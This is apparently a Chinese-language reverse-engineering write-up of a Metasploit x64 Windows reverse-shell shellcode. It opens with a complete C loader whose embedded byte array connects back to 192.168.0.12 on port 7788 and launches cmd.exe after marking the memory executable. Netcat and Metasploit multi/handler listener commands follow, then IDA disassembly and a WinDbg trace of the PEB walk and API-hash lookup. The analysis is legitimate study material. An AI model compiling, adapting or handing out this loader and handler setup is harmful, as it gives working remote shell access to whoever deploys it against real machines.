[toc]

## msf模式shellcode分析
### c代码,msf模式宿主
注意:文件后缀名为.c全名TcpKali.c 
```
#include 
#include 
#include 
//192, 168, 0, 12, 0x41为IP地址,端口号\x1e\x6c=>7788
unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x49, 0xBE, 0x77, 0x73, 0x32,
	0x5F, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xE6, 0x48, 0x81, 0xEC, 0xA0, 0x01, 0x00,
	0x00, 0x49, 0x89, 0xE5, 0x49, 0xBC, 0x02, 0x00, 0x1E, 0x6C, 192, 168, 0, 12, 0x41, 0x54,
	0x49, 0x89, 0xE4, 0x4C, 0x89, 0xF1, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x4C, 0x89,
	0xEA, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xBA, 0x29, 0x80, 0x6B, 0x00, 0xFF, 0xD5, 0x50,
	0x50, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0xFF, 0xC0,
	0x48, 0x89, 0xC1, 0x41, 0xBA, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5, 0x48, 0x89, 0xC7, 0x6A, 0x10,
	0x41, 0x58, 0x4C, 0x89, 0xE2, 0x48, 0x89, 0xF9, 0x41, 0xBA, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5,
	0x48, 0x81, 0xC4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xB8, 0x63, 0x6D, 0x64, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xE2, 0x57, 0x57, 0x57, 0x4D, 0x31, 0xC0, 0x6A, 0x0D,
	0x59, 0x41, 0x50, 0xE2, 0xFC, 0x66, 0xC7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48, 0x8D, 0x44, 0x24,
	0x18, 0xC6, 0x00, 0x68, 0x48, 0x89, 0xE6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49,
	0xFF, 0xC0, 0x41, 0x50, 0x49, 0xFF, 0xC8, 0x4D, 0x89, 0xC1, 0x4C, 0x89, 0xC1, 0x41, 0xBA, 0x79,
	0xCC, 0x3F, 0x86, 0xFF, 0xD5, 0x48, 0x31, 0xD2, 0x48, 0xFF, 0xCA, 0x8B, 0x0E, 0x41, 0xBA, 0x08,
	0x87, 0x1D, 0x60, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D,
	0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB,
	0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5
};
int main(int argc, char* argv[])
{
	int len = sizeof(shellcode);
	DWORD l = 0;
	printf("shellcode length : %d\n", len);
	//making memory executbale
	VirtualProtect(shellcode, len, PAGE_EXECUTE_READWRITE, &l);
	//hiding windows
	(*(int(*)()) shellcode)();
	return 0;
}
```
### 汇编代码
在ida里面undefine然后create function就出来了
```
.data:000000014008E000 shellcode       proc near               ; CODE XREF: main+68↑p
.data:000000014008E000                                         ; DATA XREF: main+54↑o ...
.data:000000014008E000
.data:000000014008E000 var_40          = qword ptr -40h
.data:000000014008E000
.data:000000014008E000                 cld
.data:000000014008E001 ; ---------------------------------------------------------------------------
.data:000000014008E001
.data:000000014008E001 loc_14008E001:
.data:000000014008E001                 and     rsp, 0FFFFFFFFFFFFFFF0h
.data:000000014008E005                 call    loc_14008E0CA
.data:000000014008E00A                 push    r9
.data:000000014008E00C                 push    r8
.data:000000014008E00E                 push    rdx
.data:000000014008E00F                 push    rcx
.data:000000014008E010                 push    rsi
.data:000000014008E011                 xor     rdx, rdx
.data:000000014008E014                 mov     rdx, gs:[rdx+60h]
.data:000000014008E019                 mov     rdx, [rdx+18h]
.data:000000014008E01D                 mov     rdx, [rdx+20h]
.data:000000014008E021
.data:000000014008E021 loc_14008E021:                          ; CODE XREF: shellcode+C5↓j
.data:000000014008E021                 mov     rsi, [rdx+50h]
.data:000000014008E025                 movzx   rcx, word ptr [rdx+4Ah]
.data:000000014008E02A                 xor     r9, r9
.data:000000014008E02D
.data:000000014008E02D loc_14008E02D:                          ; CODE XREF: shellcode+3E↓j
.data:000000014008E02D                 xor     rax, rax
.data:000000014008E030                 lodsb
.data:000000014008E031                 cmp     al, 61h
.data:000000014008E033                 jl      short loc_14008E037
.data:000000014008E035                 sub     al, 20h
.data:000000014008E037
.data:000000014008E037 loc_14008E037:                          ; CODE XREF: shellcode+33↑j
.data:000000014008E037                 ror     r9d, 0Dh
.data:000000014008E03B                 add     r9d, eax
.data:000000014008E03E                 loop    loc_14008E02D
.data:000000014008E040                 push    rdx
.data:000000014008E041                 push    r9
.data:000000014008E043                 mov     rdx, [rdx+20h]
.data:000000014008E047                 mov     eax, [rdx+3Ch]
.data:000000014008E04A                 add     rax, rdx
.data:000000014008E04D                 mov     eax, [rax+88h]
.data:000000014008E053                 test    rax, rax
.data:000000014008E056                 jz      short loc_14008E0BF
.data:000000014008E058                 add     rax, rdx
.data:000000014008E05B                 push    rax
.data:000000014008E05C                 mov     ecx, [rax+18h]
.data:000000014008E05F                 mov     r8d, [rax+20h]
.data:000000014008E063                 add     r8, rdx
.data:000000014008E066
.data:000000014008E066 loc_14008E066:                          ; CODE XREF: shellcode+8C↓j
.data:000000014008E066                 jrcxz   loc_14008E0BE
.data:000000014008E068                 dec     rcx
.data:000000014008E06B                 mov     esi, [r8+rcx*4]
.data:000000014008E06F                 add     rsi, rdx
.data:000000014008E072                 xor     r9, r9
.data:000000014008E075
.data:000000014008E075 loc_14008E075:                          ; CODE XREF: shellcode+82↓j
.data:000000014008E075                 xor     rax, rax
.data:000000014008E078                 lodsb
.data:000000014008E079                 ror     r9d, 0Dh
.data:000000014008E07D                 add     r9d, eax
.data:000000014008E080                 cmp     al, ah
.data:000000014008E082                 jnz     short loc_14008E075
.data:000000014008E084                 add     r9, [rsp+48h+var_40]
.data:000000014008E089                 cmp     r9d, r10d
.data:000000014008E08C                 jnz     short loc_14008E066
.data:000000014008E08E                 pop     rax
.data:000000014008E08F                 mov     r8d, [rax+24h]
.data:000000014008E093                 add     r8, rdx
.data:000000014008E096                 mov     cx, [r8+rcx*2]
.data:000000014008E09B                 mov     r8d, [rax+1Ch]
.data:000000014008E09F                 add     r8, rdx
.data:000000014008E0A2                 mov     eax, [r8+rcx*4]
.data:000000014008E0A6                 add     rax, rdx
.data:000000014008E0A9                 pop     r8
.data:000000014008E0AB                 pop     r8
.data:000000014008E0AD                 pop     rsi
.data:000000014008E0AE                 pop     rcx
.data:000000014008E0AF                 pop     rdx
.data:000000014008E0B0                 pop     r8
.data:000000014008E0B2                 pop     r9
.data:000000014008E0B4                 pop     r10
.data:000000014008E0B6                 sub     rsp, 20h
.data:000000014008E0BA                 push    r10
.data:000000014008E0BC                 jmp     rax
.data:000000014008E0BE ; ---------------------------------------------------------------------------
.data:000000014008E0BE
.data:000000014008E0BE loc_14008E0BE:                          ; CODE XREF: shellcode:loc_14008E066↑j
.data:000000014008E0BE                 pop     rax
.data:000000014008E0BF
.data:000000014008E0BF loc_14008E0BF:                          ; CODE XREF: shellcode+56↑j
.data:000000014008E0BF                 pop     r9
.data:000000014008E0C1                 pop     rdx
.data:000000014008E0C2                 mov     rdx, [rdx]
.data:000000014008E0C5                 jmp     loc_14008E021
.data:000000014008E0C5 shellcode       endp
.data:000000014008E0C5
.data:000000014008E0CA ; ---------------------------------------------------------------------------
.data:000000014008E0CA
.data:000000014008E0CA loc_14008E0CA:                          ; CODE XREF: shellcode+5↑p
.data:000000014008E0CA                 pop     rbp
.data:000000014008E0CB                 mov     r14, 32335F327377h
.data:000000014008E0D5                 push    r14
.data:000000014008E0D7                 mov     r14, rsp
.data:000000014008E0DA                 sub     rsp, 1A0h
.data:000000014008E0E1                 mov     r13, rsp
.data:000000014008E0E4                 mov     r12, 0C00A8C06C1E0002h
.data:000000014008E0EE                 push    r12
.data:000000014008E0F0                 mov     r12, rsp
.data:000000014008E0F3                 mov     rcx, r14
.data:000000014008E0F6                 mov     r10d, 726774Ch
.data:000000014008E0FC                 call    rbp
.data:000000014008E0FE                 mov     rdx, r13
.data:000000014008E101                 push    101h
.data:000000014008E106                 pop     rcx
.data:000000014008E107                 mov     r10d, 6B8029h
.data:000000014008E10D                 call    rbp
.data:000000014008E10F                 push    rax
.data:000000014008E110                 push    rax
.data:000000014008E111                 xor     r9, r9
.data:000000014008E114                 xor     r8, r8
.data:000000014008E117                 inc     rax
.data:000000014008E11A                 mov     rdx, rax
.data:000000014008E11D                 inc     rax
.data:000000014008E120                 mov     rcx, rax
.data:000000014008E123                 mov     r10d, 0E0DF0FEAh
.data:000000014008E129                 call    rbp
.data:000000014008E12B                 mov     rdi, rax
.data:000000014008E12E                 push    10h
.data:000000014008E130                 pop     r8
.data:000000014008E132                 mov     rdx, r12
.data:000000014008E135                 mov     rcx, rdi
.data:000000014008E138                 mov     r10d, 6174A599h
.data:000000014008E13E                 call    rbp
.data:000000014008E140                 add     rsp, 240h
.data:000000014008E147                 mov     r8, 646D63h
.data:000000014008E151                 push    r8
.data:000000014008E153                 push    r8
.data:000000014008E155                 mov     rdx, rsp
.data:000000014008E158                 push    rdi
.data:000000014008E159                 push    rdi
.data:000000014008E15A                 push    rdi
.data:000000014008E15B                 xor     r8, r8
.data:000000014008E15E                 push    0Dh
.data:000000014008E160                 pop     rcx
.data:000000014008E161
.data:000000014008E161 loc_14008E161:                          ; CODE XREF: .data:000000014008E163↓j
.data:000000014008E161                 push    r8
.data:000000014008E163                 loop    loc_14008E161
.data:000000014008E165                 mov     word ptr [rsp+54h], 101h
.data:000000014008E16C                 lea     rax, [rsp+18h]
.data:000000014008E171                 mov     byte ptr [rax], 68h
.data:000000014008E174                 mov     rsi, rsp
.data:000000014008E177                 push    rsi
.data:000000014008E178                 push    rax
.data:000000014008E179                 push    r8
.data:000000014008E17B                 push    r8
.data:000000014008E17D                 push    r8
.data:000000014008E17F                 inc     r8
.data:000000014008E182                 push    r8
.data:000000014008E184                 dec     r8
.data:000000014008E187                 mov     r9, r8
.data:000000014008E18A                 mov     rcx, r8
.data:000000014008E18D                 mov     r10d, 863FCC79h
.data:000000014008E193                 call    rbp
.data:000000014008E195                 xor     rdx, rdx
.data:000000014008E198                 dec     rdx
.data:000000014008E19B                 mov     ecx, [rsi]
.data:000000014008E19D                 mov     r10d, 601D8708h
.data:000000014008E1A3                 call    rbp
.data:000000014008E1A5                 mov     ebx, 0A2A1DE0h
.data:000000014008E1AA                 mov     r10d, 9DBD95A6h
.data:000000014008E1B0                 call    rbp
.data:000000014008E1B2                 add     rsp, 28h
.data:000000014008E1B6                 cmp     al, 6
.data:000000014008E1B8                 jl      short loc_14008E1C4
.data:000000014008E1BA                 cmp     bl, 0E0h
.data:000000014008E1BD                 jnz     short loc_14008E1C4
.data:000000014008E1BF                 mov     ebx, 6F721347h
.data:000000014008E1C4
.data:000000014008E1C4 loc_14008E1C4:                          ; CODE XREF: .data:000000014008E1B8↑j
.data:000000014008E1C4                                         ; .data:000000014008E1BD↑j
.data:000000014008E1C4                 push    0
.data:000000014008E1C6                 pop     rcx
.data:000000014008E1C7                 mov     r10d, ebx
.data:000000014008E1CA                 call    rbp
.data:000000014008E1CA ; ---------------------------------------------------------------------------
.data:000000014008E1CC                 db    0
.data:000000014008E1CD                 db    0
.data:000000014008E1CE                 db    0
.data:000000014008E1CF                 db    0
.data:000000014008E1D0 ; char format[]
.data:000000014008E1D0 format          db 'shellcode length : %d',0Ah,0
```

###  运行方法
```
nc模式:
nc.exe -lvp 7788
msf模式:
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp 
set lhost 10.120.1.17
set lport 7788
run
```
### 汇编分析
```
//在这里call最新执行的代码这样根据堆栈平衡原理rbp正好这行代码下面的位置,实际下面的代码就是获取导出库指定的导出函数根据传递hash值在r10d,然后调用call
0:000> p
TcpKali!shellcode+0x1:
00000001`3f21e001 4883e4f0        and     rsp,0FFFFFFFFFFFFFFF0h
0:000> p
TcpKali!shellcode+0x5:
00000001`3f21e005 e8c0000000      call    TcpKali!shellcode+0xca (00000001`3f21e0ca)
//call这个rbp第一步是获取peb结构
0:000> p
TcpKali!shellcode+0x14:
//这段是获取peb
00000001`3f21e014 65488b5260      mov     rdx,qword ptr gs:[rdx+60h] gs:00000000`00000060=????????????????
//使用peb命令查看peb
0:000> !peb
//peb地址和rdx值相同
PEB at 000007fffffdd000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         000000013f190000
    Ldr                       000000007731d640
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 0000000000483080 . 0000000000483470
    Ldr.InLoadOrderModuleList:           0000000000482f50 . 0000000000483630
    Ldr.InMemoryOrderModuleList:         0000000000482f60 . 0000000000483640
            Base TimeStamp                     Module
       13f190000 5e7c3d78 Mar 26 13:28:24 2020 C:\dl\nc\TcpKali.exe
        771f0000 595fa942 Jul 07 23:31:14 2017 C:\Windows\SYSTEM32\ntdll.dll
        770d0000 595fa987 Jul 07 23:32:23 2017 C:\Windows\system32\kernel32.dll
     7fefd2b0000 595fa988 Jul 07 23:32:24 2017 C:\Windows\system32\KERNELBASE.dll
    SubSystemData:     0000000000000000
    ProcessHeap:       0000000000480000
    ProcessParameters: 00000000004822e0
    CurrentDirectory:  'C:\Program Files\Debugging Tools for Windows (x64)\'
    WindowTitle:  'C:\dl\nc\TcpKali.exe'
    ImageFile:    'C:\dl\nc\TcpKali.exe'
    CommandLine:  'C:\dl\nc\TcpKali.exe'
    DllPath:      'C:\dl\nc;;C:\Windows\system32;C:\Windows\system;C:\Windows;.;C:\Program Files\Debugging Tools for Windows (x64)\winext\arcade;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\;C:\Program Files\Microsoft SQL Server\100\Tools\Binn\;C:\Program Files\Microsoft SQL Server\100\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\VSShell\Common7\IDE\;C:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE\PrivateAssemblies\;C:\Program Files (x86)\Microsoft SQL Server\100\DTS\Binn\'
    Environment:  0000000000481380
        =::=::\
        ALLUSERSPROFILE=C:\ProgramData
        APPDATA=C:\Users\Administrator\AppData\Roaming
        CommonProgramFiles=C:\Program Files\Common Files
        CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
        CommonProgramW6432=C:\Program Files\Common Files
        COMPUTERNAME=WIN-8GH5KO4VOUC
        ComSpec=C:\Windows\system32\cmd.exe
        FP_NO_HOST_CHECK=NO
        HOMEDRIVE=C:
        HOMEPATH=\Users\Administrator
        LOCALAPPDATA=C:\Users\Administrator\AppData\Local
        LOGONSERVER=\\WIN-8GH5KO4VOUC
        NUMBER_OF_PROCESSORS=1
        OS=Windows_NT
        Path=C:\Program Files\Debugging Tools for Windows (x64)\winext\arcade;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\;C:\Program Files\Microsoft SQL Server\100\Tools\Binn\;C:\Program Files\Microsoft SQL Server\100\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\VSShell\Common7\IDE\;C:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE\PrivateAssemblies\;C:\Program Files (x86)\Microsoft SQL Server\100\DTS\Binn\
        PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
        PROCESSOR_ARCHITECTURE=AMD64
        PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
        PROCESSOR_LEVEL=6
        PROCESSOR_REVISION=4f01
        ProgramData=C:\ProgramData
        ProgramFiles=C:\Program Files
        ProgramFiles(x86)=C:\Program Files (x86)
        ProgramW6432=C:\Program Files
        PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
        PUBLIC=C:\Users\Public
        SESSIONNAME=Console
        SystemDrive=C:
        SystemRoot=C:\Windows
        TEMP=C:\Users\ADMINI~1\AppData\Local\Temp
        TMP=C:\Users\ADMINI~1\AppData\Local\Temp
        USERDOMAIN=WIN-8GH5KO4VOUC
        USERNAME=Administrator
        USERPROFILE=C:\Users\Administrator
        WINDBG_DIR=C:\Program Files\Debugging Tools for Windows (x64)
        windir=C:\Windows
        windows_tracing_flags=3
        windows_tracing_logfile=C:\BVTBin\Tests\installpackage\csilogfile.log
        _NT_SYMBOL_PATH=SRV*C:\symbols*http://msdl.microsoft.com/download/symbols/
0:000> dt nt!_peb  000007fffffdd000
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x8 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsLegacyProcess  : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 SpareBits        : 0y000
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00000001`3f190000 Void
   //导出库链表在这里
   +0x018 Ldr              : 0x00000000`7731d640 _PEB_LDR_DATA
   +0x020 ProcessParameters : 0x00000000`004822e0 _RTL_USER_PROCESS_PARAMETERS
   +0x028 SubSystemData    : (null) 
   +0x030 ProcessHeap      : 0x00000000`00480000 Void
   +0x038 FastPebLock      : 0x00000000`77327ae0 _RTL_CRITICAL_SECTION
   +0x040 AtlThunkSListPtr : (null) 
   +0x048 IFEOKey          : (null) 
   +0x050 CrossProcessFlags : 0
   +0x050 ProcessInJob     : 0y0
   +0x050 ProcessInitializing : 0y0
   +0x050 ProcessUsingVEH  : 0y0
   +0x050 ProcessUsingVCH  : 0y0
   +0x050 ProcessUsingFTH  : 0y0
   +0x050 ReservedBits0    : 0y000000000000000000000000000 (0)
   +0x058 KernelCallbackTable : (null) 
   +0x058 UserSharedInfoPtr : (null) 
   +0x060 SystemReserved   : [1] 0
   +0x064 AtlThunkSListPtr32 : 0
   +0x068 ApiSetMap        : 0x000007fe`ff510000 Void
   +0x070 TlsExpansionCounter : 0
   +0x078 TlsBitmap        : 0x00000000`7731d590 Void
   +0x080 TlsBitmapBits    : [2] 0x11
   +0x088 ReadOnlySharedMemoryBase : 0x00000000`7efe0000 Void
   +0x090 HotpatchInformation : (null) 
   +0x098 ReadOnlyStaticServerData : 0x00000000`7efe0a90  -> (null) 
   +0x0a0 AnsiCodePageData : 0x000007ff`fffa0000 Void
   +0x0a8 OemCodePageData  : 0x000007ff`fffa0000 Void
   +0x0b0 UnicodeCaseTableData : 0x000007ff`fffd0028 Void
   +0x0b8 NumberOfProcessors : 1
   +0x0bc NtGlobalFlag     : 0x70
   +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000
   +0x0c8 HeapSegmentReserve : 0x100000
   +0x0d0 HeapSegmentCommit : 0x2000
   +0x0d8 HeapDeCommitTotalFreeThreshold : 0x10000
   +0x0e0 HeapDeCommitFreeBlockThreshold : 0x1000
   +0x0e8 NumberOfHeaps    : 3
   +0x0ec MaximumNumberOfHeaps : 0x10
   +0x0f0 ProcessHeaps     : 0x00000000`77327840  -> 0x00000000`00480000 Void
   +0x0f8 GdiSharedHandleTable : (null) 
   +0x100 ProcessStarterHelper : (null) 
   +0x108 GdiDCAttributeList : 0
   +0x110 LoaderLock       : 0x00000000`77322490 _RTL_CRITICAL_SECTION
   +0x118 OSMajorVersion   : 6
   +0x11c OSMinorVersion   : 1
   +0x120 OSBuildNumber    : 0x1db1
   +0x122 OSCSDVersion     : 0x100
   +0x124 OSPlatformId     : 2
   +0x128 ImageSubsystem   : 3
   +0x12c ImageSubsystemMajorVersion : 6
   +0x130 ImageSubsystemMinorVersion : 0
   +0x138 ActiveProcessAffinityMask : 1
   +0x140 GdiHandleBuffer  : [60] 0
   +0x230 PostProcessInitRoutine : (null) 
   +0x238 TlsExpansionBitmap : 0x00000000`7731d580 Void
   +0x240 TlsExpansionBitmapBits : [32] 1
   +0x2c0 SessionId        : 1
   +0x2c8 AppCompatFlags   : _ULARGE_INTEGER 0x0
   +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0
   +0x2d8 pShimData        : (null) 
   +0x2e0 AppCompatInfo    : (null) 
   +0x2e8 CSDVersion       : _UNICODE_STRING "Service Pack 1"
   +0x2f8 ActivationContextData : 0x00000000`00040000 _ACTIVATION_CONTEXT_DATA
   +0x300 ProcessAssemblyStorageMap : (null) 
   +0x308 SystemDefaultActivationContextData : 0x00000000`00030000 _ACTIVATION_CONTEXT_DATA
   +0x310 SystemAssemblyStorageMap : (null) 
   +0x318 MinimumStackCommit : 0
   +0x320 FlsCallback      : 0x00000000`00485010 _FLS_CALLBACK_INFO
   +0x328 FlsListHead      : _LIST_ENTRY [ 0x00000000`00484bd0 - 0x484bd0 ]
   +0x338 FlsBitmap        : 0x00000000`7731d570 Void
   +0x340 FlsBitmapBits    : [4] 3
   +0x350 FlsHighIndex     : 1
   +0x358 WerRegistrationData : (null) 
   +0x360 WerShipAssertPtr : (null) 
   +0x368 pContextData     : 0x00000000`00050000 Void
   +0x370 pImageHeaderHash : (null) 
   +0x378 TracingFlags     : 0
   +0x378 HeapTracingEnabled : 0y0
   +0x378 CritSecTracingEnabled : 0y0
   +0x378 SpareTracingBits : 0y000000000000000000000000000000 (0)
0:000> p
TcpKali!shellcode+0x19:
00000001`3f21e019 488b5218        mov     rdx,qword ptr [rdx+18h] ds:000007ff`fffdd018={ntdll!PebLdr (00000000`7731d640)}
0:000> dps @rdx
//这里就是peb
000007ff`fffdd000  00000000`08010000
000007ff`fffdd008  ffffffff`ffffffff
000007ff`fffdd010  00000001`3f190000 TcpKali!__ImageBase
000007ff`fffdd018  00000000`7731d640 ntdll!PebLdr
000007ff`fffdd020  00000000`004822e0
000007ff`fffdd028  00000000`00000000
000007ff`fffdd030  00000000`00480000
000007ff`fffdd038  00000000`77327ae0 ntdll!FastPebLock
000007ff`fffdd040  00000000`00000000
000007ff`fffdd048  00000000`00000000
000007ff`fffdd050  00000000`00000000
000007ff`fffdd058  00000000`00000000
000007ff`fffdd060  00000000`00000000
000007ff`fffdd068  000007fe`ff510000
000007ff`fffdd070  00000000`00000000
000007ff`fffdd078  00000000`7731d590 ntdll!TlsBitMap
//继续
0:000> p
TcpKali!shellcode+0x1d:
00000001`3f21e01d 488b5220        mov     rdx,qword ptr [rdx+20h] ds:00000000`7731d660=0000000000482f60
   //导出库链表在这个结构里
0:000> dt nt!_PEB_LDR_DATA @rdx+18h
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x7731d640
   +0x004 Initialized      : 0 ''
   +0x008 SsHandle         : 0x00000000`004822e0 Void
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x00000000`00000000 - 0x480000 ]
   //导出库链表在这里是个_LIST_ENTRY结构
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x00000000`77327ae0 - 0x0 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x00000000`00000000 - 0x0 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 ''
   +0x050 ShutdownThreadId : 0x000007fe`ff510000 Void 
 //继续
 0:000> p
TcpKali!shellcode+0x21:
00000001`3f21e021 488b7250        mov     rsi,qword ptr [rdx+50h] ds:00000000`00482fb0=0000000000482dc2
 //使用!list查看导出库链表结构
0:000> !list -t nt!_LIST_ENTRY.Flink -x "dps @$extret L10" 0x00000000`00482f60
00000000`00482f60  00000000`00483070
00000000`00482f68  00000000`7731d660 ntdll!PebLdr+0x20
00000000`00482f70  00000000`00000000
00000000`00482f78  00000000`00000000
00000000`00482f80  00000001`3f190000 TcpKali!__ImageBase
00000000`00482f88  00000001`3f191890 TcpKali!mainCRTStartup [f:\dd\vctools\crt\crtw32\startup\crt0.c @ 155]
00000000`00482f90  00000000`0009a000
00000000`00482f98  00000000`002a0028
00000000`00482fa0  00000000`00482db0
00000000`00482fa8  00000000`00180016
00000000`00482fb0  00000000`00482dc2
00000000`00482fb8  0000ffff`00004000
00000000`00482fc0  00000000`77327220 ntdll!LdrpHashTable+0x80
00000000`00482fc8  00000000`77327220 ntdll!LdrpHashTable+0x80
00000000`00482fd0  00000000`5e7c3d78
00000000`00482fd8  00000000`00000000

00000000`00483070  00000000`00483460
00000000`00483078  00000000`00482f60
00000000`00483080  00000000`00483650
00000000`00483088  00000000`7731d670 ntdll!PebLdr+0x30
00000000`00483090  00000000`771f0000 ntdll!RtlDeactivateActivationContext   (ntdll+0x0)
00000000`00483098  00000000`00000000
00000000`004830a0  00000000`001aa000
00000000`004830a8  00000000`003c003a
00000000`004830b0  00000000`00482e80
00000000`004830b8  00000000`00140012
//+50就是导出表字符串名称
00000000`004830c0  00000000`773003b0 ntdll!`string'
00000000`004830c8  0000ffff`00004004
00000000`004830d0  00000000`77327320 ntdll!LdrpHashTable+0x180
00000000`004830d8  00000000`77327320 ntdll!LdrpHashTable+0x180
00000000`004830e0  00000000`595fa942
00000000`004830e8  00000000`00000000
//xor清零rax,和r9后循环读入rsi使用lodsb命令
0:000> dps @rsi
00000000`00482dc2  004b0070`00630054
00000000`00482dca  002e0069`006c0061
00000000`00482dd2  00000065`00780065
00000000`00482dda  0064005c`003a0043
00000000`00482de2  0063006e`005c006c
00000000`00482dea  00700063`0054005c
00000000`00482df2  0069006c`0061004b
00000000`00482dfa  00650078`0065002e
00000000`00482e02  005c003a`00430000
00000000`00482e0a  006e005c`006c0064
00000000`00482e12  00630054`005c0063
00000000`00482e1a  006c0061`004b0070
00000000`00482e22  00780065`002e0069
00000000`00482e2a  00690057`00000065
00000000`00482e32  00610074`0073006e
00000000`00482e3a  00650044`005c0030
0:000> r
rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000018
rdx=0000000000482f60 rsi=0000000000482dc2 rdi=00000000002bfa20
rip=000000013f21e030 rsp=00000000002bf7e0 rbp=000000013f21e00a
 r8=00000000002bf938  r9=0000000000000000 r10=000000000726774c
r11=0000000000000202 r12=00000000002bf810 r13=00000000002bf818
r14=00000000002bf9b8 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
TcpKali!shellcode+0x30:
00000001`3f21e030 ac              lods    byte ptr [rsi] ds:00000000`00482dc2=54
//判断al是不是61就是说判断是不是kernel32的导出库
TcpKali!shellcode+0x31:
00000001`3f21e031 3c61            cmp     al,61h
//到这步是循环hash值算法,对应shellcode工程中的GetProcAddressWithHash方法
0:000> p
TcpKali!shellcode+0x3e:
00000001`3f21e03e e2ed            loop    TcpKali!shellcode+0x2d (00000001`3f21e02d) [br=1]
